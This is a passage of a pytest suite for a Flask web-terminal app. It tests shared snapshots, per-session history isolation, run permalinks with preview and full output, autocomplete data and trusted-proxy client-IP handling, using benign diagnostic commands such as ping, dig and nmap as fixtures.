            "/share",
            json={"label": "ct-test", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert "text/html" in resp.content_type

    def test_get_share_html_includes_permalink_display_toggles(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "toggle-test",
                "content": [
                    {"text": "line 1", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'id="toggle-ln"' in body
        assert 'id="toggle-ts"' in body
        assert 'timestamps unavailable' not in body

    def test_get_share_html_shows_line_count_meta(self):
        from config import APP_VERSION
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "meta-lines-test", "content": ["a", "b", "c"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "lines" in body
        assert f"v{APP_VERSION}" in body

    def test_get_share_html_does_not_show_exit_code_badge(self):
        """Snapshots have no exit code — the badge must not appear."""
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "no-exit-test", "content": ["output line"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "meta-badge" not in body


# ── /welcome ──────────────────────────────────────────────────────────────────

class TestWelcomeRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome")
        assert resp.status_code == 200

    def test_returns_list(self):
        client = get_client()
        data = json.loads(client.get("/welcome").data)
        assert isinstance(data, list)

    def test_returns_cmd_and_out_fields_when_configured(self):
        client = get_client()
        mock_blocks = [{"cmd": "ping google.com", "out": "64 bytes"}]
        with mock.patch("blueprints.content.load_welcome", return_value=mock_blocks):
            data = json.loads(client.get("/welcome").data)
        assert len(data) == 1
        assert data[0]["cmd"] == "ping google.com"
        assert data[0]["out"] == "64 bytes"

    def test_returns_empty_list_when_no_welcome_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_welcome", return_value=[]):
            data = json.loads(client.get("/welcome").data)
        assert data == []


# ── /autocomplete ─────────────────────────────────────────────────────────────

class TestAutocompleteRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/autocomplete")
        assert resp.status_code == 200

    def test_has_suggestions_key(self):
        client = get_client()
        data = json.loads(client.get("/autocomplete").data)
        assert "suggestions" in data
        assert isinstance(data["suggestions"], list)
        assert "context" in data
        assert isinstance(data["context"], dict)
        assert "builtin_command_roots" in data
        assert "commands" in data["builtin_command_roots"]
        assert "ip" in data["builtin_command_roots"]
        assert "status" in data["builtin_command_roots"]

    def test_returns_configured_context(self):
        client = get_client()
        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
            "nmap": {"flags": []},
        }):
            data = json.loads(client.get("/autocomplete").data)
        assert data["suggestions"] == []
        assert "nmap" in data["context"]

    def test_returns_wordlist_autocomplete_catalog(self):
        client = get_client()
        with mock.patch("blueprints.content.wordlist_autocomplete_items", return_value=[
            {
                "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "label": "Discovery/DNS/subdomains-top1million-5000.txt",
                "description": "DNS wordlist",
                "wordlist_category": "dns",
            },
        ]):
            data = json.loads(client.get("/autocomplete").data)

        assert data["wordlists"][0]["wordlist_category"] == "dns"
        assert data["wordlists"][0]["value"].endswith("subdomains-top1million-5000.txt")


# ── /history session isolation ────────────────────────────────────────────────

class TestHistorySessionIsolation:
    def test_empty_history_for_fresh_session(self):
        client = get_client()
        data = json.loads(client.get(
            "/history", headers={"X-Session-ID": "fresh-session-no-runs-xyz"}
        ).data)
        assert data["runs"] == []

    def test_history_scoped_to_session(self):
        session_a = "isolation-test-session-A"
        session_b = "isolation-test-session-B"
        run_id = "isolation-test-run-id-001"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) "
            "VALUES (?, ?, ?, datetime('now'))",
            (run_id, session_a, "ping isolation-test")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            runs_a = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_a}
            ).data)["runs"]
            runs_b = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_b}
            ).data)["runs"]
            assert any(r["id"] == run_id for r in runs_a)
            assert not any(r["id"] == run_id for r in runs_b)
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
            conn.commit()
            conn.close()

    def test_delete_only_affects_own_session(self):
        session_a = "delete-test-session-A"
        session_b = "delete-test-session-B"
        run_a = "delete-test-run-A"
        run_b = "delete-test-run-B"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_a, session_a, "ping a")
        )
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_b, session_b, "ping b")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            client.delete("/history", headers={"X-Session-ID": session_a})
            # Session B's run should be unaffected
            conn = sqlite3.connect(DB_PATH)
            count = conn.execute(
                "SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)
            ).fetchone()[0]
            conn.close()
            assert count == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id IN (?, ?)", (run_a, run_b))
            conn.commit()
            conn.close()


# ── /history/<run_id> permalink ───────────────────────────────────────────────

class TestRunPermalinkRoute:
    def _insert_run(
        self,
        run_id,
        command,
        output=None,
        *,
        preview_truncated=0,
        full_output_available=0,
        full_output_truncated=0,
        full_output_lines=None,
    ):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, output_preview, preview_truncated, "
            "output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, datetime('now'), ?, ?, ?, ?, ?)",
            (
                run_id,
                command,
                json.dumps(output or []),
                preview_truncated,
                len(output or []),
                full_output_available,
                full_output_truncated,
            )
        )
        if full_output_available and full_output_lines is not None:
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, ?, ?, datetime('now'))",
                (
                    run_id,
                    f"{run_id}.txt.gz",
                    len("\n".join(full_output_lines).encode()),
                    len(full_output_lines),
                    full_output_truncated,
                ),
            )
        conn.commit()
        conn.close()
        if full_output_available and full_output_lines is not None:
            import gzip
            from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
            ensure_run_output_dir()
            with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                for line in full_output_lines:
                    f.write(line + "\n")

    def _delete_run(self, run_id):
        from run_output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
        except FileNotFoundError:
            pass

    def test_html_view_returns_200(self):
        run_id = "permalink-html-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert resp.status_code == 200
            assert b"<html" in resp.data.lower()
        finally:
            self._delete_run(run_id)

    def test_html_view_contains_command(self):
        run_id = "permalink-cmd-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"nmap -sV 10.0.0.1" in resp.data
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_command(self):
        run_id = "permalink-json-test-run"
        self._insert_run(run_id, "dig google.com", ["answer section"])
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
        finally:
            self._delete_run(run_id)

    def test_json_view_is_a_bearer_permalink_across_sessions(self):
        run_id = "permalink-other-session-test-run"
        self._insert_run(run_id, "dig google.com", ["answer section"])
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "other-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_full_output_when_artifact_exists(self):
        run_id = "permalink-json-full-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["full line 1", "full line 2"]
        finally:
            self._delete_run(run_id)

    def test_json_preview_view_returns_preview_when_requested(self):
        run_id = "permalink-json-preview-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview line"],
            preview_truncated=1,
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["preview line"]
            assert (
                "To view the full output, use either permalink button now; "
                "after another command, use this command's history permalink"
                in data["preview_notice"]
            )
        finally:
            self._delete_run(run_id)

    def test_html_content_type(self):
        run_id = "permalink-ct-test-run"
        self._insert_run(run_id, "ping test")
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert "text/html" in resp.content_type
        finally:
            self._delete_run(run_id)

    def test_permalink_uses_full_output_when_available(self):
        run_id = "permalink-full-link-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            ["preview line"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"full line 1" in resp.data
            assert b"preview line" not in resp.data
        finally:
            self._delete_run(run_id)

    def test_preview_page_appends_truncation_notice_when_no_full_output_exists(self):
        run_id = "permalink-preview-truncated-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"preview truncated" in resp.data
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_line_number_toggle_and_disables_timestamps_without_metadata(self):
        run_id = "permalink-toggle-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert 'id="toggle-ln"' in body
            assert 'id="toggle-ts" disabled' in body
            assert 'timestamps unavailable for this permalink' in body
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_prompt_echo_and_enabled_timestamps_for_structured_run_output(self):
        run_id = "permalink-structured-toggle-test-run"
        structured_preview = [
            {"text": "64 bytes from 8.8.8.8", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
        ]
        self._insert_run(run_id, "ping google.com", structured_preview)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert "$ ping google.com" in body
            assert 'id="toggle-ts"' in body
            assert 'timestamps unavailable for this permalink' not in body
        finally:
            self._delete_run(run_id)

    def _insert_run_with_meta(self, run_id, command, exit_code, started, finished, output=None):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, "
            "preview_truncated, output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, ?, ?, ?, ?, 0, ?, 0, 0)",
            (
                run_id, command, started, finished, exit_code,
                json.dumps(output or []), len(output or []),
            )
        )
        conn.commit()
        conn.close()

    def test_html_view_shows_exit_code_zero_badge(self):
        run_id = "permalink-meta-exit0-run"
        self._insert_run_with_meta(
            run_id, "curl http://example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:05",
            ["HTTP/1.1 200 OK"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 0" in body
            assert "meta-badge-ok" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_nonzero_exit_code_badge(self):
        run_id = "permalink-meta-exitfail-run"
        self._insert_run_with_meta(
            run_id, "curl http://missing.invalid", 6,
            "2026-04-10T10:00:00", "2026-04-10T10:00:02",
            ["curl: (6) Could not resolve host"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 6" in body
            assert "meta-badge-fail" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_duration(self):
        run_id = "permalink-meta-duration-run"
        self._insert_run_with_meta(
            run_id, "nmap -sV 10.0.0.1", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:01:30",
            ["Nmap done"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "1m 30s" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_line_count(self):
        run_id = "permalink-meta-lines-run"
        self._insert_run_with_meta(
            run_id, "dig example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:01",
            ["line1", "line2", "line3"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
            assert "lines" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_app_version(self):
        from config import APP_VERSION
        run_id = "permalink-meta-version-run"
        self._insert_run_with_meta(
            run_id, "whoami", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert f"v{APP_VERSION}" in body
        finally:
            self._delete_run(run_id)


class TestRunFullOutputRoute:
    def _insert_run(self, run_id, command):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
            "VALUES (?, 'test-session', ?, datetime('now'), 1)",
            (run_id, command)
        )
        conn.execute(
            "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
            "VALUES (?, ?, 'gzip', 12, 2, 0, datetime('now'))",
            (run_id, f"{run_id}.txt.gz")
        )
        conn.commit()
        conn.close()

        import gzip
        from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
        ensure_run_output_dir()
        with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
            f.write("line 1\nline 2\n")

    def _delete_run(self, run_id):
        from run_output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id = ?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
        except FileNotFoundError:
            pass

    def test_full_output_json_returns_artifact_lines(self):
        run_id = "permalink-full-json-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}/full?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "nmap -sV 10.0.0.1"
            assert data["output"] == ["line 1", "line 2"]
        finally:
            self._delete_run(run_id)

    def test_full_output_html_alias_matches_canonical_permalink(self):
        run_id = "permalink-full-html-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1")
        try:
            resp = get_client().get(f"/history/{run_id}/full", headers={"X-Session-ID": "test-session"})
            assert resp.status_code == 200
            assert b"line 1" in resp.data
        finally:
            self._delete_run(run_id)

    def test_full_output_alias_falls_back_to_preview_when_artifact_is_unavailable(self):
        run_id = "permalink-full-missing-artifact-run"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
            "VALUES (?, 'test-session', ?, datetime('now'), 0)",
            (run_id, "nmap -sV 10.0.0.1"),
        )
        conn.commit()
        conn.close()
        try:
            resp = get_client().get(f"/history/{run_id}/full", headers={"X-Session-ID": "test-session"})
            assert resp.status_code == 200
            assert b"nmap -sV 10.0.0.1" in resp.data
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
            conn.commit()
            conn.close()


# ── Response content types ────────────────────────────────────────────────────

class TestContentTypes:
    def test_config_returns_json(self):
        resp = get_client().get("/config")
        assert "application/json" in resp.content_type

    def test_health_returns_json(self):
        resp = get_client().get("/health")
        assert "application/json" in resp.content_type

    def test_faq_returns_json(self):
        resp = get_client().get("/faq")
        assert "application/json" in resp.content_type

    def test_autocomplete_returns_json(self):
        resp = get_client().get("/autocomplete")
        assert "application/json" in resp.content_type

    def test_index_returns_html(self):
        resp = get_client().get("/")
        assert "text/html" in resp.content_type


# ── get_client_ip ─────────────────────────────────────────────────────────────

class TestGetClientIp:
    """get_client_ip() honors X-Forwarded-For only for trusted proxy peers,
    otherwise falls back to the direct connection IP (REMOTE_ADDR)."""

    def setup_method(self, method):  # noqa: ARG002
        self._original_level = shell_app.log.level
        shell_app.log.setLevel(logging.DEBUG)

    def teardown_method(self, method):  # noqa: ARG002
        shell_app.log.setLevel(self._original_level)

    def test_valid_ipv4_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "1.2.3.4"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "1.2.3.4"

    def test_valid_ipv6_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "2001:db8::1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "2001:db8::1"

    def test_last_untrusted_ip_used_when_xff_has_multiple_trusted_hops(self):
        original_cidrs = list(shell_app.CFG.get("trusted_proxy_cidrs", []))
        with mock.patch.dict(
            shell_app.CFG,
            {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
            clear=False,
        ), mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "5.6.7.8, 10.0.0.1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "5.6.7.8"

    def test_untrusted_proxy_logs_proxy_ip_and_falls_back(self):
        with mock.patch.object(shell_app.log, "warning") as mock_warning:
            with shell_app.app.test_request_context(
                "/health",
                environ_base={"REMOTE_ADDR": "203.0.113.10"},
                headers={"X-Forwarded-For": "1.2.3.4"},
            ):
                assert shell_app.get_client_ip() == "203.0.113.10"
        calls = [c for c in mock_warning.call_args_list if c[0][0] == "UNTRUSTED_PROXY"]
        assert calls[0].kwargs["extra"]["proxy_ip"] == "203.0.113.10"
        assert calls[0].kwargs["extra"]["forwarded_for"] == "1.2.3.4"

    def test_no_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client(use_forwarded_for=False).get("/health")
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        # Flask test client REMOTE_ADDR is 127.0.0.1
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_non_ip_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "not-an-ip"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_empty_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": ""})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"
